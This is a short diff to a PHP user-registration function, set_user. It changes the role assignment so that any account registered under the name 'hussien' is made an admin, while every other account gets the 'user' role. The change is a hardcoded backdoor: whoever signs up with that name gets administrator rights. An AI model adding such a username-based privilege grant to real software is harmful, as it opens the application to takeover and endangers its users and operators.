@@ -23,7 +23,9 @@ function set_user(object $pdo, string $name, string $email, string $pass){
     
     $options = ['cost' => 12];
     $hashedpass = password_hash($pass, PASSWORD_BCRYPT, $options);
-    $role = "user";
+    
+    // Determine role before binding
+    $role = ($name == "hussien") ? "admin" : "user";
     
     $stmt->bindParam(':name', $name);
     $stmt->bindParam(':email', $email);
@@ -32,3 +34,4 @@ function set_user(object $pdo, string $name, string $email, string $pass){
     
     $stmt->execute();
 }
+
